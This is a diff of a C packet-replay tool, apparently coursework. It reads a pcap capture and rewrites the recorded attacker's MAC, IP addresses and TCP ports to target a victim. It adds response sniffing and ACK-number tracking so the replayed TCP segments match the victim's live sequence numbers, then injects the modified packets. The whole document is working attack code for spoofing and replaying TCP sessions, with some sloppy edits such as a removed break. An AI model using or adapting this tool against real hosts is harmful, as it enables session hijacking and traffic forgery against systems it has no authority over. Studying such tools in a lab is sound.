@@ -11,6 +11,7 @@
 #include "packet_sniffing.h"
 #include <netinet/tcp.h>
 
+//JUST READS CONFIG FILE AND OPENS PCAP FILE
 int read_cfg_file(char *cgf_file){
   int pcap_fd;
   FILE *cfg_fp;
@@ -25,16 +26,21 @@ int read_cfg_file(char *cgf_file){
   fgets(pcap_file_name, sizeof(pcap_file_name), cfg_fp);
   pcap_file_name[strcspn(pcap_file_name, "\n")] = 0;
   pcap_fd = open(pcap_file_name, O_RDONLY);
+  
   if (pcap_fd < 0){
     printf("Error opening pcap file\n");
     fclose(cfg_fp);
     return -1;
   }
 
+  //Parse PCAP global header
   read_pcap_global_header(pcap_fd);
+  
+  //Read PCAP file, and create packet based on parameters
   create_att_pkt(pcap_fd, cfg_fp);
   return 0;  
 }
+
 
 void read_pcap_global_header(int pcap_fd){
   struct pcap_file_header pcaphdr;
@@ -79,18 +85,20 @@ void create_att_pkt(int pcap_fd, FILE *cfg_fp){
   struct config_data cfg_info;
   cfg_info = read_cfg(cfg_fp);
 
+
+  //Initialize ethernet interface for ethernet and sniffer
   if(init_eth(cfg_info.interface) < 0){
     printf("Error initializing ethernet interface\n");
     return;
+  }	
+  if(init_sniffer(cfg_info.interface) < 0){
+    printf("Error initializaing sniffer\n");
+	return;
   }
-	
-	if(init_sniffer(cfg_info.interface) < 0){
-		printf("Error initializaing sniffer\n");
-		return;
-	}
 
+  //While there are packets in pcap file
   while(read(pcap_fd, &pkthdr, sizeof(pkthdr)) != 0){
- 
+    //Print timing on each packet
     if(firsttime){
       firsttime = 0;
       b_sec = pkthdr.ts.tv_sec;
@@ -104,17 +112,24 @@ void create_att_pkt(int pcap_fd, FILE *cfg_fp){
       c_usec += 1000000;
     }
 
+    //Print packet length and time info
     printf("\nPacket %u\n", pkt_count);
     printf("%u.%06u\n", (unsigned)c_sec, (unsigned)c_usec);
     pkt_count++; 
     printf("Captured Packet Length = %d\n", pkthdr.caplen);
     printf("Actual Packet Length = %d\n",pkthdr.len);
   
+
+	//Read entire packet
     read(pcap_fd, packet_buffer,pkthdr.len);
 
+	//Create ptr to ethernet header in packet buffer
     ethhdr = (struct eth_hdr *)packet_buffer;
     printf("Ethernet Header\n");
 
+	//Check to see if ethernet MAC of current packet matches attacker IP
+	//If so, replace with our own MAC
+	//Prepares packet for sending
     if(memcmp(&ethhdr->eth_src, &cfg_info.attacker_mac, sizeof(eth_addr_t)) == 0){
       printf("   src_mac = %s\n", eth_ntoa(&ethhdr->eth_src));
       printf("   dst_mac = %s\n", eth_ntoa(&cfg_info.replay_victim_mac));
@@ -124,11 +139,13 @@ void create_att_pkt(int pcap_fd, FILE *cfg_fp){
       printf("   rep_dst_mac = %s\n", eth_ntoa(&ethhdr->eth_dst));
     
     }
+	//If not, just print the packet information and data as is
     else{
       printf("   src_mac = %s\n", eth_ntoa(&ethhdr->eth_src));
       printf("   dst_mac = %s\n", eth_ntoa(&ethhdr->eth_dst));
     }
 
+	  //Check whether packet is IP packet or ARP (link layer only)
       switch(ntohs(ethhdr->eth_type)){
         case ETH_TYPE_IP:  
           read_ip(packet_buffer, &cfg_info);
@@ -148,10 +165,15 @@ void create_att_pkt(int pcap_fd, FILE *cfg_fp){
 void read_ip(unsigned char *packet_buffer, struct config_data *cfg_info){
   struct ip_hdr *iphdr;
 
+  //Create ptr to IP header in packet buffer
+  //+ETH_HDR_LEN to skip those bytes, and end on ethernet header
   iphdr = (struct ip_hdr *)(packet_buffer + ETH_HDR_LEN);
+
+  //Print IP packet length + IP addresses
   printf("   IP\n");
   printf("      ip_len = %u\n", ntohs(iphdr->ip_len));
 
+  //Print the source and destination IP addresses
   uint8_t *ip_bytes = (uint8_t *)&iphdr->ip_src;
   printf("      ip_src = %u.%u.%u.%u\n",
          ip_bytes[0], ip_bytes[1], ip_bytes[2], ip_bytes[3]);
@@ -160,10 +182,14 @@ void read_ip(unsigned char *packet_buffer, struct config_data *cfg_info){
   printf("      ip_dst = %u.%u.%u.%u\n",
          dst_bytes[0], dst_bytes[1], dst_bytes[2], dst_bytes[3]);
 
+  //Check if the source IP address matches attacker IP
+  //if so, switch with our IP adddress
   if (memcmp(&iphdr->ip_src, &cfg_info->attacker_ip, sizeof(ip_addr_t)) == 0) {
+      //Replace source and dst IP with mine, and the victim machines IP
       memcpy(&iphdr->ip_src, &cfg_info->replay_attacker_ip, sizeof(ip_addr_t));
       memcpy(&iphdr->ip_dst, &cfg_info->replay_victim_ip, sizeof(ip_addr_t));
 
+	  //Print new IP addresses
       ip_bytes = (uint8_t *)&iphdr->ip_src;
       printf("      rep_src = %u.%u.%u.%u\n",
              ip_bytes[0], ip_bytes[1], ip_bytes[2], ip_bytes[3]);
@@ -173,7 +199,10 @@ void read_ip(unsigned char *packet_buffer, struct config_data *cfg_info){
              dst_bytes[0], dst_bytes[1], dst_bytes[2], dst_bytes[3]);
   }
 
+  //Calculate true header size of IP packet
   unsigned int true_hdr_size = iphdr->ip_hl * 4;
+
+  //Check to see what kind of packet encapsulated within IP packet
   switch (iphdr->ip_p) {
       case IP_PROTO_TCP:
           read_tcp(true_hdr_size, packet_buffer, cfg_info);
@@ -214,30 +243,38 @@ void read_arp(unsigned char *packet_buffer){
       break;
     default:
       printf("      Unknown");
-      break;
+   
   }
 }
 
 void read_tcp(unsigned int true_hdr_size, unsigned char *packet_buffer, struct config_data *cfg_info) {
     struct tcp_hdr *tcphdr;
+	
+	//Create TCP header ptr in packet buffer
+	//+ ETH + true IP hdr size to skip those bytes and land on TCP hdr.
     tcphdr = (struct tcp_hdr *)(packet_buffer + ETH_HDR_LEN + true_hdr_size);
     printf("      TCP\n");
 
+	//Point to the src and dst ports on TCP header
     uint16_t src_port = ntohs(tcphdr->th_sport);
     uint16_t dst_port = ntohs(tcphdr->th_dport);
 
+	//Print TCP port and syn/ack #s of current unaltered packet
     printf("         src_port = %u\n", src_port);
     printf("         dst_port = %u\n", dst_port);
     printf("         seq = %u\n", ntohl(tcphdr->th_seq));
     printf("         ack = %u\n", ntohl(tcphdr->th_ack));
 
+	//IF the src port of current packet matches the port of the attacker, and the dst port matches
+	
+	//victims port, then switch out the ports for mine and the victims in the packet
     if (src_port == cfg_info->attacker_port && dst_port == cfg_info->victim_port) {
         tcphdr->th_sport = htons(cfg_info->replay_attacker_port);
         tcphdr->th_dport = htons(cfg_info->replay_victim_port);
 
         // Update ACK number to track victim sequence
-        tcphdr->th_ack = htonl(latest_victim_seq + 1);
-        tcphdr->th_flags |= TH_ACK; // Ensure ACK flag is set
+        tcphdr->th_ack = htonl(latest_victim_seq);
+        
 
         printf("         rep_src_port = %u\n", ntohs(tcphdr->th_sport));
         printf("         rep_dst_port = %u\n", ntohs(tcphdr->th_dport));
@@ -246,10 +283,30 @@ void read_tcp(unsigned int true_hdr_size, unsigned char *packet_buffer, struct c
         struct ip_hdr *iphdr = (struct ip_hdr *)(packet_buffer + ETH_HDR_LEN);
         ip_checksum(iphdr, ntohs(iphdr->ip_len));
 
-        if (send_modified_packet(packet_buffer, ntohs(iphdr->ip_len) + ETH_HDR_LEN, cfg_info) == 0) {
-            printf("   Packet sent\n");
-        }
-    }
+	//If the timing is delay, 
+	if (strcmp(cfg_info->timing, "delay") == 0) {
+   		struct pcap_pkthdr hdr;
+
+		//Sniff victim response packets
+   		receive_victim_packet(cfg_info, &hdr);
+
+		//Imeplement delay for pacing
+   		usleep(500000);  // Optional small pacing delay
+	}
+
+	//If the latest packet seq is not zero, update the attackers ACK
+  if (latest_victim_seq != 0) {
+    tcphdr->th_ack = htonl(latest_victim_seq);
+    printf("         updated ack = %u\n", latest_victim_seq);
+  }
+
+  //Recalculate packet checksum after altering ACK #
+  ip_checksum(iphdr, ntohs(iphdr->ip_len));
+
+  if (send_modified_packet(packet_buffer, ntohs(iphdr->ip_len) + ETH_HDR_LEN, cfg_info) == 0) {
+    printf("   Packet sent\n");
+  }	
+	}
 }
 
 void read_udp(unsigned int true_hdr_size, unsigned char *packet_buffer){
@@ -265,7 +322,7 @@ void read_icmp(unsigned int true_hdr_size, unsigned char *packet_buffer){
   icmphdr = (struct icmp_hdr *)(packet_buffer + ETH_HDR_LEN + true_hdr_size);
   printf("      ICMP\n");
   switch(icmphdr->icmp_type) {
-        case ICMP_ECHOREPLY:
+    case ICMP_ECHOREPLY:
           printf("         Echo Reply");
           break;
         case ICMP_UNREACH:
